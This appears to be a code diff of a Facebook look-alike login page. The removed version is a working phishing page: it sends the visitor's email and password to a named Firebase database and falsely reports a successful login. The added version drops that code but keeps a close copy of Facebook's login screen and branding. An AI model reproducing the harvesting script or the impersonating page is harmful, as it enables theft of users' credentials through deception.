@@ -1,155 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Social Login</title>
-
-<style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family: Arial, sans-serif;
-}
-
-/* TOP BAR */
-.topbar{
-  background:#1877f2;
-  color:white;
-  padding:15px;
-  text-align:center;
-  font-size:28px;
-  font-weight:bold;
-  letter-spacing:1px;
-}
-
-/* PAGE CENTER */
-body{
-  background:#f0f2f5;
-}
-
-/* CONTAINER */
-.wrapper{
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:90vh;
-}
-
-/* LOGIN BOX */
-.card{
-  background:white;
-  width:340px;
-  padding:25px;
-  border-radius:10px;
-  box-shadow:0 4px 12px rgba(0,0,0,0.1);
-  text-align:center;
-}
-
-.card h2{
-  margin-bottom:15px;
-  color:#333;
-}
-
-input{
-  width:100%;
-  padding:12px;
-  margin:8px 0;
-  border:1px solid #ddd;
-  border-radius:6px;
-  outline:none;
-}
-
-input:focus{
-  border-color:#1877f2;
-}
-
-button{
-  width:100%;
-  padding:12px;
-  border:none;
-  border-radius:6px;
-  cursor:pointer;
-  font-weight:bold;
-  margin-top:10px;
-}
-
-.login{
-  background:#1877f2;
-  color:white;
-}
-
-.create{
-  background:#42b72a;
-  color:white;
-}
-
-#msg{
-  margin-top:10px;
-  font-size:14px;
-  color:green;
-}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      background: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .left-panel {
+      margin-right: 60px;
+      flex: 1;
+      max-width: 480px;
+      text-align: left;
+    }
+    .facebook-logo {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      letter-spacing: -2px;
+      line-height: 60px;
+      font-family: "Segoe UI", Arial, sans-serif;
+    }
+    .facebook-desc {
+      font-size: 28px;
+      line-height: 32px;
+      color: #1c1e21;
+    }
+    .login-card {
+      background: #fff;
+      padding: 24px 0 28px 0;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px 0 rgba(0,0,0,.15);
+      width: 375px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .login-card form {
+      width: 90%;
+      display: flex;
+      flex-direction: column;
+    }
+    .login-input {
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      padding: 13px 16px;
+      margin-bottom: 14px;
+      outline: none;
+      background: #f5f6f7;
+    }
+    .login-input:focus {
+      border-color: #1877f2;
+    }
+    .login-btn {
+      background: #1877f2;
+      color: #fff;
+      font-size: 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      padding: 13px 0;
+      margin-bottom: 14px;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .login-btn:hover {
+      background: #166fe5;
+    }
+    .forgot-link {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 15px;
+      margin: 8px auto 0 auto;
+      text-align: center;
+    }
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+    .divider {
+      width: 100%;
+      border-top: 1px solid #dadde1;
+      margin: 20px 0 16px 0;
+    }
+    .create-btn {
+      background: #42b72a;
+      color: #fff;
+      font-weight: bold;
+      font-size: 17px;
+      border: none;
+      border-radius: 6px;
+      padding: 13px 0;
+      margin: 0 auto;
+      width: 60%;
+      cursor: pointer;
+      transition: background .2s;
+      display: block;
+    }
+    .create-btn:hover {
+      background: #36a420;
+    }
+    .bottom-text {
+      text-align: center;
+      margin-top: 48px;
+      font-size: 14px;
+    }
+    .bottom-text a {
+      font-weight: bold;
+      color: #1c1e21;
+      text-decoration: none;
+      margin-left: 5px;
+    }
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+        align-items: flex-start;
+        justify-content: flex-start;
+        margin-top: 40px;
+      }
+      .left-panel {
+        margin-bottom: 30px;
+        margin-right: 0;
+        text-align: center;
+        max-width: 100%;
+      }
+      .facebook-logo {
+        font-size: 48px;
+      }
+    }
+    @media (max-width: 480px) {
+      .login-card {
+        width: 97vw;
+        min-width:unset;
+        padding: 18px 0 18px 0;
+      }
+    }
+  </style>
 </head>
-
 <body>
-
-<div class="topbar">
-  Facebook 
-</div>
-
-<div class="wrapper">
-
-  <div class="card">
-
-    <h2>Login to continue</h2>
-
-    <input id="email" type="email" placeholder="Email or phone">
-    <input id="pasword" type="text" placeholder="Password">
-
-    <button class="login" onclick="saveData()">Log In</button>
-    <button class="create">Create New Account</button>
-
-    <div id="msg"></div>
-
+  <div class="container">
+    <div class="left-panel">
+      <div class="facebook-logo">
+        facebook
+      </div>
+      <div class="facebook-desc">
+        Facebook helps you connect and share<br />with the people in your life.
+      </div>
+    </div>
+    <div class="login-card">
+      <form onsubmit="event.preventDefault(); fakeLogin();">
+        <input
+          type="text"
+          class="login-input"
+          placeholder="Email address or phone number"
+          id="email"
+          required
+        />
+        <input
+          type="password"
+          class="login-input"
+          placeholder="Password"
+          id="password"
+          required
+        />
+        <button class="login-btn" type="submit">Log In</button>
+      </form>
+      <a class="forgot-link" href="#">Forgotten password?</a>
+      <div class="divider"></div>
+      <button class="create-btn">Create new account</button>
+      <div id="msg" style="margin-top:14px; font-size: 15px; color: green;"></div>
+    </div>
   </div>
-
-</div>
-
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-const firebaseConfig = {
-  apiKey: "YOUR_API_KEY",
-  authDomain: "YOUR_PROJECT.firebaseapp.com",
-  databaseURL: "https://vuva-b4e3e-default-rtdb.firebaseio.com",
-  projectId: "vuva-b4e3e",
-  storageBucket: "YOUR_PROJECT.appspot.com",
-  messagingSenderId: "YOUR_ID",
-  appId: "YOUR_APP_ID"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
-window.saveData = function(){
-
-  const email = document.getElementById("email").value;
-  const pasword = document.getElementById("pasword").value;
-
-  const newRef = push(ref(db, "users"));
-
-  set(newRef, {
-    email: email,
-    pasword: pasword
-  });
-
-  document.getElementById("msg").innerText = "Login successful ✔";
-
-}
-</script>
-
+  <div class="bottom-text">
+    <a href="#">Create a Page</a> for a celebrity, brand or business.
+  </div>
+  <script>
+    function fakeLogin() {
+      document.getElementById("msg").innerText = "This is a demo UI. No real login performed.";
+    }
+    document.querySelector('.create-btn').onclick = function() {
+      document.getElementById("msg").innerText = "Sign up functionality is not implemented in this demo.";
+    }
+  </script>
 </body>
 </html>
